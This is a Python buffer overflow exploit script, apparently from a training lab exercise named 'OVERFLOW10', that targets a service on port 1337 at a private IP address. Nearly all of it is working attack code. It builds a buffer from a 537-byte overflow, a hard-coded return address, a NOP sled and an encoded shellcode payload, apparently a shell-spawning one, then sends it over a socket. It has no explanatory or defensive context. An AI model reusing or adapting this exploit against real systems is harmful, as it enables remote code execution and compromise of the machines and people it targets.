#!/usr/bin/env python3
import socket

ip = "10.10.80.211"
port = 1337

prefix = "OVERFLOW10 "
offset = 537
overflow = "A" * offset
retn = "\x03\x12\x50\x62"
padding = "\x90" * 16
payload = ("\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x81\x2c\x07\x6c\x83\xee\xfc\xe2\xf4\x7d\xc4\x85\x6c"
"\x81\x2c\x67\xe5\x64\x1d\xc7\x08\x0a\x7c\x37\xe7\xd3\x20"
"\x8c\x3e\x95\xa7\x75\x44\x8e\x9b\x4d\x4a\xb0\xd3\xab\x50"
"\xe0\x50\x05\x40\xa1\xed\xc8\x61\x80\xeb\xe5\x9e\xd3\x7b"
"\x8c\x3e\x91\xa7\x4d\x50\x0a\x60\x16\x14\x62\x64\x06\xbd"
"\xd0\xa7\x5e\x4c\x80\xff\x8c\x25\x99\xcf\x3d\x25\x0a\x18"
"\x8c\x6d\x57\x1d\xf8\xc0\x40\xe3\x0a\x6d\x46\x14\xe7\x19"
"\x77\x2f\x7a\x94\xba\x51\x23\x19\x65\x74\x8c\x34\xa5\x2d"
"\xd4\x0a\x0a\x20\x4c\xe7\xd9\x30\x06\xbf\x0a\x28\x8c\x6d"
"\x51\xa5\x43\x48\xa5\x77\x5c\x0d\xd8\x76\x56\x93\x61\x73"
"\x58\x36\x0a\x3e\xec\xe1\xdc\x44\x34\x5e\x81\x2c\x6f\x1b"
"\xf2\x1e\x58\x38\xe9\x60\x70\x4a\x86\xd3\xd2\xd4\x11\x2d"
"\x07\x6c\xa8\xe8\x53\x3c\xe9\x05\x87\x07\x81\xd3\xd2\x3c"
"\xd1\x7c\x57\x2c\xd1\x6c\x57\x04\x6b\x23\xd8\x8c\x7e\xf9"
"\x90\x06\x84\x44\x0d\x6a\x96\x2d\x6f\x6e\x81\x3d\x5b\xe5"
"\x67\x46\x17\x3a\xd6\x44\x9e\xc9\xf5\x4d\xf8\xb9\x04\xec"
"\x73\x60\x7e\x62\x0f\x19\x6d\x44\xf7\xd9\x23\x7a\xf8\xb9"
"\xe9\x4f\x6a\x08\x81\xa5\xe4\x3b\xd6\x7b\x36\x9a\xeb\x3e"
"\x5e\x3a\x63\xd1\x61\xab\xc5\x08\x3b\x6d\x80\xa1\x43\x48"
"\x91\xea\x07\x28\xd5\x7c\x51\x3a\xd7\x6a\x51\x22\xd7\x7a"
"\x54\x3a\xe9\x55\xcb\x53\x07\xd3\xd2\xe5\x61\x62\x51\x2a"
"\x7e\x1c\x6f\x64\x06\x31\x67\x93\x54\x97\xe7\x71\xab\x26"
"\x6f\xca\x14\x91\x9a\x93\x54\x10\x01\x10\x8b\xac\xfc\x8c"
"\xf4\x29\xbc\x2b\x92\x5e\x68\x06\x81\x7f\xf8\xb9")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
